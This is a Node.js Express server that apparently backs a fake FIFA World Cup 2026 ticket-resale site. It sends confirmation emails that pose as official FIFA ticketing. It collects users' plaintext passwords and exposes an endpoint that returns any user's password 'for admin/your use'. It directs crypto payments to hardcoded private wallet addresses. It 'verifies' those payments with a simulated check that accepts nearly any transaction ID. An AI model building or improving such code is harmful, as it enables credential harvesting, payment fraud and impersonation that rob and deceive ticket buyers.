const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
require('dotenv').config();

const nodemailer = require('nodemailer');

// Email transporter configuration
const transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST || 'smtp.gmail.com',
    port: process.env.EMAIL_PORT || 587,
    secure: false,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Verify email configuration on startup
transporter.verify((error, success) => {
    if (error) {
        console.log('❌ Email configuration error:', error);
    } else {
        console.log('✅ Email server is ready to send messages');
    }
});

const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// In-memory storage (use MongoDB/PostgreSQL in production)
const transactions = [];
const userCredentials = []; // NEW: Store username/password combinations

// Your cryptocurrency addresses
const CRYPTO_ADDRESSES = {
    'USDT_TRC20': 'TJzKVimFzF7tGQUH1NemCrctiZPPWrRzj6',
    'SOL': 'BeCmckF5KDGCY3jxG2r8o8VqQy8JySyA94i9osB45sVd',
    'BTC': 'bc1qqnmz38llzghmaskhq6wy3n6hjk68gh570a27sw',
    'ETH': '0x7978f226bbce9f03cac5c6d32526291a776b7436',
    'USDT_ERC20': '0xf4f2db3ce0cf82594255ab301b77e0beec2e1a47'
};

// Network information
const CRYPTO_NETWORKS = {
    'USDT_TRC20': 'TRC20 Network',
    'SOL': 'SOLANA Network',
    'BTC': 'Bitcoin Network',
    'ETH': 'Ethereum ERC20 Network',
    'USDT_ERC20': 'Ethereum ERC20 Network'
};

// Generate unique transaction ID
function generateTransactionId() {
    return 'FIFA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

// Validate transaction ID format based on cryptocurrency
function validateTransactionId(txnId, cryptoType) {
    const validators = {
        'BTC': (id) => /^[a-fA-F0-9]{64}$/.test(id),
        'ETH': (id) => /^0x[a-fA-F0-9]{64}$/.test(id),
        'USDT_ERC20': (id) => /^0x[a-fA-F0-9]{64}$/.test(id),
        'USDT_TRC20': (id) => /^[a-fA-F0-9]{64}$/.test(id),
        'SOL': (id) => /^[a-zA-Z0-9]{87,88}$/.test(id)
    };
    
    const validator = validators[cryptoType];
    return validator ? validator(txnId) : true; // Default to true if no validator
}

// NEW: Store user credentials endpoint
app.post('/api/store-credentials', (req, res) => {
    try {
        const { username, password, email, name } = req.body;
        
        console.log('🔐 Storing credentials:', { username, password, email, name });
        
        // Check if user already exists
        const existingUserIndex = userCredentials.findIndex(user => user.username === username || user.email === email);
        
        if (existingUserIndex !== -1) {
            // Update existing user
            userCredentials[existingUserIndex] = {
                username,
                password, // Store the actual password
                email,
                name,
                timestamp: new Date().toISOString()
            };
        } else {
            // Add new user
            userCredentials.push({
                username,
                password, // Store the actual password
                email,
                name,
                timestamp: new Date().toISOString()
            });
        }
        
        console.log('✅ Credentials stored successfully');
        console.log('📊 Current users:', userCredentials.map(u => ({ username: u.username, email: u.email })));
        
        res.json({
            success: true,
            message: 'Credentials stored successfully'
        });
        
    } catch (error) {
        console.error('❌ Error storing credentials:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// NEW: Retrieve password endpoint (for admin/your use)
app.get('/api/get-password/:username', (req, res) => {
    try {
        const { username } = req.params;
        
        console.log('🔍 Looking up password for:', username);
        console.log('📊 Available users:', userCredentials.map(u => u.username));
        
        const user = userCredentials.find(u => u.username === username);
        
        if (user) {
            res.json({
                success: true,
                username: user.username,
                password: user.password, // Return the actual password
                email: user.email,
                name: user.name,
                timestamp: user.timestamp
            });
        } else {
            res.status(404).json({
                success: false,
                message: 'User not found'
            });
        }
        
    } catch (error) {
        console.error('❌ Error retrieving password:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// NEW: Get all users (for admin/your use)
app.get('/api/all-users', (req, res) => {
    try {
        res.json({
            success: true,
            count: userCredentials.length,
            users: userCredentials.map(user => ({
                username: user.username,
                email: user.email,
                name: user.name,
                timestamp: user.timestamp
                // Note: Not returning passwords here for security
            }))
        });
    } catch (error) {
        console.error('❌ Error retrieving users:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// Health check - UPDATED to show new endpoints
app.get('/', (req, res) => {
    res.json({ 
        status: '🎉 FIFA Ticket Backend with Stripe & Crypto - Running!',
        version: '3.0.0',
        stripe: 'Enabled',
        crypto_payments: 'ENABLED',
        password_storage: 'ENABLED - In Memory',
        acceptedCards: ['Visa', 'Mastercard', 'American Express', 'Discover', 'Diners Club', 'JCB', 'UnionPay'],
        acceptedCrypto: ['USDT (TRC20)', 'SOLANA', 'Bitcoin (BTC)', 'Ethereum (ETH)', 'USDT (ERC20)'],
        currencies: ['USD', 'EUR', 'GBP', 'NGN', 'and 135+ more'],
        endpoints: [
            'POST /api/store-credentials',
            'GET /api/get-password/:username',
            'GET /api/all-users',
            'POST /api/process-payment',
            'POST /api/create-payment-intent',
            'POST /api/verify-crypto',
            'GET /api/crypto-addresses',
            'GET /api/transactions',
            'GET /api/transaction/:id'
        ]
    });
});

// ✅ Get Stripe publishable key - REMOVE hardcoded fallback
app.get('/api/stripe-config', (req, res) => {
    res.json({
        publishableKey: process.env.STRIPE_PUBLISHABLE_KEY
    });
});

// NEW: Get crypto addresses endpoint
app.get('/api/crypto-addresses', (req, res) => {
    res.json({
        success: true,
        addresses: CRYPTO_ADDRESSES,
        networks: CRYPTO_NETWORKS
    });
});

// Process card payment
app.post('/api/process-payment', async (req, res) => {
    try {
        const {
            customer,
            tickets,
            subtotal,
            fee,
            tax,
            total,
            currency = 'USD'
        } = req.body;

        console.log('💳 Payment request received:', {
            amount: total,
            currency,
            customer: customer.email,
            tickets: tickets.length
        });

        // Step 1: Create a Customer in Stripe
        const stripeCustomer = await stripe.customers.create({
            email: customer.email,
            name: customer.name,
            address: {
                line1: customer.address,
                city: customer.city,
                postal_code: customer.postal,
                country: customer.country
            }
        });

        console.log('✅ Customer created:', stripeCustomer.id);

        // Step 2: Create Payment Intent (without confirming yet)
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            customer: stripeCustomer.id,
            description: `FIFA World Cup 2026™ - ${tickets.length} Ticket(s)`,
            receipt_email: customer.email,
            metadata: {
                customer_name: customer.name,
                customer_email: customer.email,
                tickets_count: tickets.length,
                subtotal: subtotal.toString(),
                fee: fee.toString(),
                tax: tax.toString()
            }
        });

        console.log('✅ Payment Intent created:', paymentIntent.id);

        // Return client secret to frontend
        res.json({
            success: true,
            clientSecret: paymentIntent.client_secret,
            paymentIntentId: paymentIntent.id,
            customerId: stripeCustomer.id
        });

    } catch (error) {
        console.error('❌ Payment error:', error.message);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// Confirm payment after frontend tokenization
app.post('/api/confirm-payment', async (req, res) => {
    try {
        const { paymentIntentId, paymentMethodId } = req.body;

        // Confirm the payment with the payment method
        const paymentIntent = await stripe.paymentIntents.confirm(
            paymentIntentId,
            { payment_method: paymentMethodId }
        );

        if (paymentIntent.status === 'succeeded') {
            const transactionId = generateTransactionId();
            const transaction = {
                transactionId,
                stripePaymentId: paymentIntent.id,
                status: 'completed',
                timestamp: new Date().toISOString()
            };

            transactions.push(transaction);

            res.json({
                success: true,
                transactionId,
                message: 'Payment successful!'
            });
        } else {
            res.json({
                success: false,
                message: 'Payment failed: ' + paymentIntent.status
            });
        }

    } catch (error) {
        res.json({
            success: false,
            message: error.message
        });
    }
});

// Create Payment Intent
app.post('/api/create-payment-intent', async (req, res) => {
    try {
        const { total, currency = 'USD', customer, tickets } = req.body;

        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            receipt_email: customer.email,
            description: `FIFA World Cup 2026 - ${tickets.length} Ticket(s)`,
            metadata: {
                customer_name: customer.name,
                customer_email: customer.email,
                tickets_count: tickets.length
            }
        });

        res.json({
            success: true,
            clientSecret: paymentIntent.client_secret,
            paymentIntentId: paymentIntent.id
        });

    } catch (error) {
        res.json({
            success: false,
            message: error.message
        });
    }
});

// Enhanced Crypto payment verification
// Enhanced Crypto payment verification - UPDATED WITH EMAIL
app.post('/api/verify-crypto', async (req, res) => {
    try {
        const {
            transactionId,
            senderAddress,
            cryptoType,
            expectedAmount,
            customer,
            tickets,
            paymentAddress
        } = req.body;

        console.log('₿ Crypto verification request:', {
            transactionId,
            cryptoType,
            senderAddress,
            expectedAmount,
            customer: customer.email,
            paymentAddress
        });

        // Validate required fields
        if (!transactionId || !senderAddress) {
            return res.json({
                success: false,
                verified: false,
                message: 'Transaction ID and sender address are required'
            });
        }

        // Validate transaction ID format
        if (!validateTransactionId(transactionId, cryptoType)) {
            return res.json({
                success: false,
                verified: false,
                message: `Invalid transaction ID format for ${cryptoType}. Please check the format.`
            });
        }

        // Verify payment address matches our records
        if (paymentAddress && CRYPTO_ADDRESSES[cryptoType] !== paymentAddress) {
            console.warn('⚠️ Payment address mismatch:', { expected: CRYPTO_ADDRESSES[cryptoType], received: paymentAddress });
        }

        // Simulate blockchain verification
        console.log(`🔍 Verifying ${cryptoType} transaction: ${transactionId}`);
        await new Promise(resolve => setTimeout(resolve, 3000));

        const verificationResult = await simulateBlockchainVerification(
            transactionId, 
            senderAddress, 
            cryptoType, 
            expectedAmount,
            paymentAddress
        );

        if (!verificationResult.verified) {
            return res.json({
                success: false,
                verified: false,
                message: verificationResult.message || 'Transaction verification failed'
            });
        }

        // Create transaction record
        const internalTxnId = generateTransactionId();
        const transaction = {
            transactionId: internalTxnId,
            type: 'crypto',
            cryptoType,
            cryptoTxnId: transactionId,
            senderAddress,
            paymentAddress: paymentAddress || CRYPTO_ADDRESSES[cryptoType],
            customer,
            tickets,
            amounts: {
                subtotal: expectedAmount - (expectedAmount * 0.15) - (expectedAmount * 0.085),
                fee: expectedAmount * 0.15,
                tax: expectedAmount * 0.085,
                total: expectedAmount
            },
            status: 'completed',
            network: CRYPTO_NETWORKS[cryptoType],
            timestamp: new Date().toISOString(),
            verification: {
                confirmations: verificationResult.confirmations,
                amount: verificationResult.amount,
                verifiedAt: new Date().toISOString()
            }
        };

        transactions.push(transaction);

        console.log('✅ Crypto payment verified:', {
            internalTxnId,
            cryptoType,
            amount: expectedAmount,
            customer: customer.email
        });

        // ✅ SEND CONFIRMATION EMAIL
        const emailHtml = generateTicketEmail(customer, tickets, { cryptoType, transactionId }, internalTxnId, 'crypto');
        const emailResult = await sendEmail(
            customer.email,
            `🎉 FIFA World Cup 2026 - Ticket Confirmation #${internalTxnId}`,
            emailHtml
        );

        if (!emailResult.success) {
            console.warn('⚠️ Email sending failed, but payment was processed');
        }

        res.json({
            success: true,
            verified: true,
            transactionId: internalTxnId,
            message: `${cryptoType} payment verified successfully`,
            emailSent: emailResult.success,
            transaction: {
                ...transaction,
                customer: {
                    name: customer.name,
                    email: customer.email
                }
            }
        });

    } catch (error) {
        console.error('❌ Crypto verification error:', error);
        res.status(500).json({
            success: false,
            verified: false,
            message: error.message
        });
    }
});

// Simulate blockchain verification (replace with real APIs)
async function simulateBlockchainVerification(transactionId, senderAddress, cryptoType, expectedAmount, paymentAddress) {
    // Simulate API call delay
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Basic validation checks
    if (!transactionId || !senderAddress) {
        return {
            verified: false,
            message: 'Missing transaction details'
        };
    }
    
    // Check if transaction ID looks valid
    if (transactionId.length < 10) {
        return {
            verified: false,
            message: 'Invalid transaction ID format'
        };
    }
    
    // For demo purposes, accept most transactions
    // In production, implement actual blockchain verification:
    
    /*
    // Example for Bitcoin:
    if (cryptoType === 'BTC') {
        const response = await fetch(`https://blockchain.info/rawtx/${transactionId}`);
        const data = await response.json();
        // Verify transaction details...
    }
    
    // Example for Ethereum:
    if (cryptoType === 'ETH' || cryptoType === 'USDT_ERC20') {
        const response = await fetch(`https://api.etherscan.io/api?module=transaction&action=gettxreceiptstatus&txhash=${transactionId}&apikey=YOUR_API_KEY`);
        const data = await response.json();
        // Verify transaction details...
    }
    */
    
    return {
        verified: true,
        confirmations: 3,
        amount: expectedAmount,
        message: 'Transaction verified successfully'
    };
}

// NEW: Send confirmation email (for both card and crypto)
app.post('/api/send-confirmation', async (req, res) => {
    try {
        const { customer, tickets, payment, transactionId, total } = req.body;
        
        console.log('📧 Sending confirmation to:', customer.email);
        console.log('🎫 Tickets:', tickets.length);
        console.log('💰 Payment Method:', payment.method);
        console.log('🔗 Transaction ID:', transactionId);
        
        // Generate email content based on payment method
        const emailHtml = generateTicketEmail(
            customer, 
            tickets, 
            payment, 
            transactionId, 
            payment.method
        );
        
        // Send email
        const emailResult = await sendEmail(
            customer.email,
            `🎉 FIFA World Cup 2026 - Ticket Confirmation #${transactionId}`,
            emailHtml
        );
        
        res.json({
            success: true,
            message: 'Confirmation sent successfully',
            emailSent: emailResult.success
        });
        
    } catch (error) {
        console.error('❌ Error sending confirmation:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// Get all transactions
app.get('/api/transactions', (req, res) => {
    res.json({
        success: true,
        count: transactions.length,
        totalAmount: transactions.reduce((sum, t) => sum + (t.amounts?.total || t.total || 0), 0),
        cryptoTransactions: transactions.filter(t => t.type === 'crypto').length,
        cardTransactions: transactions.filter(t => t.type !== 'crypto').length,
        transactions: transactions.map(t => ({
            ...t,
            cardNumber: undefined,
            cardCVV: undefined
        }))
    });
});

// Get single transaction
app.get('/api/transaction/:id', (req, res) => {
    const transaction = transactions.find(t => t.transactionId === req.params.id);
    
    if (transaction) {
        res.json({
            success: true,
            transaction
        });
    } else {
        res.status(404).json({
            success: false,
            message: 'Transaction not found'
        });
    }
});

// Get crypto transactions only
app.get('/api/transactions/crypto', (req, res) => {
    const cryptoTransactions = transactions.filter(t => t.type === 'crypto');
    
    res.json({
        success: true,
        count: cryptoTransactions.length,
        totalCryptoAmount: cryptoTransactions.reduce((sum, t) => sum + (t.amounts?.total || t.total || 0), 0),
        transactions: cryptoTransactions
    });
});

// Stripe webhook endpoint
app.post('/webhook', express.raw({type: 'application/json'}), (req, res) => {
    const sig = req.headers['stripe-signature'];
    let event;

    try {
        event = stripe.webhooks.constructEvent(
            req.body,
            sig,
            process.env.STRIPE_WEBHOOK_SECRET
        );
    } catch (err) {
        return res.status(400).send(`Webhook Error: ${err.message}`);
    }

    switch (event.type) {
        case 'payment_intent.succeeded':
            const paymentIntent = event.data.object;
            console.log('💰 Webhook: Payment succeeded:', paymentIntent.id);
            break;
        
        case 'payment_intent.payment_failed':
            const failedPayment = event.data.object;
            console.log('❌ Webhook: Payment failed:', failedPayment.id);
            break;

        default:
            console.log(`Unhandled event type ${event.type}`);
    }

    res.json({received: true});
});

// Email template functions
function generateTicketEmail(customer, tickets, payment, transactionId, paymentMethod) {
    const ticketList = tickets.map((ticket, index) => {
        const qty = ticket.quantity || 1; // Get quantity or default to 1
        const itemTotal = ticket.price * qty; // Calculate total for this line item

        return `
        <div style="margin: 15px 0; padding: 15px; border: 1px solid #ddd; border-radius: 8px;">
            <h3 style="color: #1a1a2e; margin: 0 0 10px 0;">🎫 ${ticket.match.teams}</h3>
            <p style="margin: 5px 0;"><strong>Date:</strong> ${ticket.match.date}</p>
            <p style="margin: 5px 0;"><strong>Venue:</strong> ${ticket.match.venue}</p>
            <p style="margin: 5px 0;"><strong>Category:</strong> ${ticket.category.name}</p>
            <p style="margin: 5px 0;"><strong>Quantity:</strong> ${qty}</p>
            <p style="margin: 5px 0;"><strong>Price:</strong> USD ${itemTotal.toLocaleString()} <span style="font-size:0.8em; color:#666;">(${qty} × USD ${ticket.price.toLocaleString()})</span></p>
        </div>
    `}).join('');

    // --- MODIFICATION: Calculate subtotal using QUANTITY ---
    const subtotal = tickets.reduce((sum, item) => sum + (item.price * (item.quantity || 1)), 0);
    const fee = subtotal * 0.15;
    const tax = subtotal * 0.085;
    const total = subtotal + fee + tax;

    const paymentInfo = paymentMethod === 'crypto' ? `
        <p><strong>Payment Method:</strong> ${payment.cryptoType}</p>
        <p><strong>Transaction ID:</strong> ${payment.transactionId}</p>
    ` : `
        <p><strong>Payment Method:</strong> Credit/Debit Card</p>
        <p><strong>Transaction ID:</strong> ${transactionId}</p>
    `;

    return `
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; color: #333; }
                .header { background: #1a1a2e; color: white; padding: 20px; text-align: center; }
                .content { padding: 20px; }
                .ticket { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 8px; }
                .footer { background: #f8f9fa; padding: 15px; text-align: center; color: #666; }
                .total { background: #1a1a2e; color: white; padding: 15px; border-radius: 8px; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🎉 FIFA World Cup 2026™</h1>
                <h2>Your Ticket Purchase Confirmation</h2>
            </div>
            
            <div class="content">
                <p>Dear <strong>${customer.name}</strong>,</p>
                <p>Thank you for your purchase! Your tickets have been confirmed and are detailed below.</p>
                
                <h3>📋 Order Summary</h3>
                ${ticketList}
                
                <div class="total">
                    <h3 style="margin: 0; color: white;">💰 Payment Details</h3>
                    ${paymentInfo}
                    <p><strong>Subtotal:</strong> USD ${subtotal.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                    <p><strong>Resale Fee (15%):</strong> USD ${fee.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                    <p><strong>Tax:</strong> USD ${tax.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                    <p style="font-size: 1.2em; border-top: 1px solid rgba(255,255,255,0.3); padding-top: 10px; margin-top: 10px;">
                        <strong>Total Paid:</strong> USD ${total.toLocaleString(undefined, {minimumFractionDigits: 2})}
                    </p>
                </div>
                
                <h3>📱 Next Steps</h3>
                <p>Your tickets will be available in your FIFA account 48 hours before the match. You'll receive another email with download instructions.</p>
                
                <p><strong>Need Help?</strong></p>
                <p>Contact FIFA Ticketing Support: <a href="mailto:ticketing@fifa.org">ticketing@fifa.org</a></p>
            </div>
            
            <div class="footer">
                <p>FIFA World Cup 2026™ Official Ticketing</p>
                <p>This is an automated message. Please do not reply to this email.</p>
            </div>
        </body>
        </html>
    `;
}

function generateCryptoPendingEmail(customer, tickets, cryptoType, paymentAddress, total) {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; color: #333; }
                .header { background: #1a1a2e; color: white; padding: 20px; text-align: center; }
                .content { padding: 20px; }
                .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 8px; margin: 15px 0; }
                .address { background: #f8f9fa; padding: 15px; border-radius: 8px; font-family: monospace; word-break: break-all; }
                .footer { background: #f8f9fa; padding: 15px; text-align: center; color: #666; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>₿ FIFA World Cup 2026™</h1>
                <h2>Crypto Payment Instructions</h2>
            </div>
            
            <div class="content">
                <p>Dear <strong>${customer.name}</strong>,</p>
                <p>Your order is pending cryptocurrency payment. Please follow the instructions below to complete your purchase.</p>
                
                <div class="warning">
                    <h3>⚠️ Payment Required</h3>
                    <p>Your tickets are reserved for 1 hour pending payment confirmation.</p>
                </div>
                
                <h3>💰 Payment Details</h3>
                <p><strong>Amount Due:</strong> USD ${total.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                <p><strong>Cryptocurrency:</strong> ${cryptoType}</p>
                
                <h3>📤 Send Payment To:</h3>
                <div class="address">
                    ${paymentAddress}
                </div>
                
                <h3>📋 Order Summary</h3>
                ${tickets.map((ticket, index) => `
                    <div style="margin: 10px 0; padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
                        <strong>${ticket.match.teams}</strong><br>
                        ${ticket.match.date} • ${ticket.match.venue}<br>
                        ${ticket.category.name} - USD ${ticket.price.toLocaleString()}
                    </div>
                `).join('')}
                
                <h3>🔍 After Payment</h3>
                <p>Once you send the payment:</p>
                <ol>
                    <li>Keep your transaction ID/hash</li>
                    <li>Return to the payment page</li>
                    <li>Enter your transaction details</li>
                    <li>Click "Verify Payment"</li>
                </ol>
                
                <p><strong>Need Help?</strong> Contact: <a href="mailto:ticketing@fifa.org">ticketing@fifa.org</a></p>
            </div>
            
            <div class="footer">
                <p>FIFA World Cup 2026™ Official Ticketing</p>
            </div>
        </body>
        </html>
    `;
}

// Send email function
async function sendEmail(to, subject, html) {
    try {
        const mailOptions = {
            from: process.env.EMAIL_FROM,
            to: to,
            subject: subject,
            html: html
        };

        const result = await transporter.sendMail(mailOptions);
        console.log('✅ Email sent successfully:', result.messageId);
        return { success: true, messageId: result.messageId };
    } catch (error) {
        console.error('❌ Email sending failed:', error);
        return { success: false, error: error.message };
    }
}

// Add this function to handle successful card payments
async function handleSuccessfulCardPayment(paymentIntent, customer, tickets, total) {
    const transactionId = generateTransactionId();
    
    const transaction = {
        transactionId,
        stripePaymentId: paymentIntent.id,
        type: 'card',
        customer,
        tickets,
        amounts: {
            subtotal: total - (total * 0.15) - (total * 0.085),
            fee: total * 0.15,
            tax: total * 0.085,
            total: total
        },
        status: 'completed',
        timestamp: new Date().toISOString()
    };

    transactions.push(transaction);

    // ✅ SEND CONFIRMATION EMAIL
    const emailHtml = generateTicketEmail(customer, tickets, {}, transactionId, 'card');
    const emailResult = await sendEmail(
        customer.email,
        `🎉 FIFA World Cup 2026 - Ticket Confirmation #${transactionId}`,
        emailHtml
    );

    if (!emailResult.success) {
        console.warn('⚠️ Email sending failed, but payment was processed');
    }

    return {
        transactionId,
        emailSent: emailResult.success
    };
}

// Start server
app.listen(PORT, () => {
    console.log(`
      ╔═══════════════════════════════════════════════════════╗
    ║   🎉 FIFA Ticket Backend with STRIPE & CRYPTO - Running! ║
    ╠═══════════════════════════════════════════════════════╣
    ║   Port: ${PORT}                                          ║
    ║   URL: http://localhost:${PORT}                         ║
    ║                                                       ║
    ║   💳 Stripe Integration: ENABLED                      ║
    ║   ₿  Crypto Payments: ENABLED                         ║
    ║   🌍 Accepts: ALL international cards & crypto        ║
    ║   💰 Currencies: 135+ supported                       ║
    ║                                                       ║
    ║   Accepted Crypto:                                    ║
    ║   ✅ USDT (TRC20)                                     ║
    ║   ✅ SOLANA                                           ║
    ║   ✅ Bitcoin (BTC)                                    ║
    ║   ✅ Ethereum (ETH)                                   ║
    ║   ✅ USDT (ERC20)                                     ║
    ║                                                       ║
    ║   Accepted Cards:                                     ║
    ║   ✅ Visa                                             ║
    ║   ✅ Mastercard                                       ║
    ║   ✅ American Express                                 ║
    ║   ✅ Discover                                         ║
    ║   ✅ Diners Club                                      ║
    ║   ✅ JCB                                              ║
    ║   ✅ UnionPay                                         ║
    ║                                                       ║
    ║   Crypto Addresses Configured:                        ║
    ║   USDT-TRC20: TJzKVimFzF7tGQUH1NemCrctiZPPWrRzj6     ║
    ║   SOLANA: BeCmckF5KDGCY3jxG2r8o8VqQy8JySyA94i9osB45sVd║
    ║   BTC: bc1qqnmz38llzghmaskhq6wy3n6hjk68gh570a27sw    ║
    ║   ETH: 0x7978f226bbce9f03cac5c6d32526291a776b7436 
    ║   USDT-ERC20: 0xf4f2db3ce0cf82594255ab301b77e0beec2e1a47║
      
    ║   Test Cards (Stripe Test Mode):                     ║
    ║   4242 4242 4242 4242 (Visa - Success)               ║
    ║   5555 5555 5555 4444 (Mastercard - Success)         ║
    ║   3782 822463 10005 (Amex - Success)                 ║
    ║   4000 0000 0000 0002 (Declined)                     ║
    ║   4000 0000 0000 9995 (Insufficient Funds)           ║
    ║   Dashboard: https://dashboard.stripe.com            ║
    ╚═══════════════════════════════════════════════════════╝
    `);
});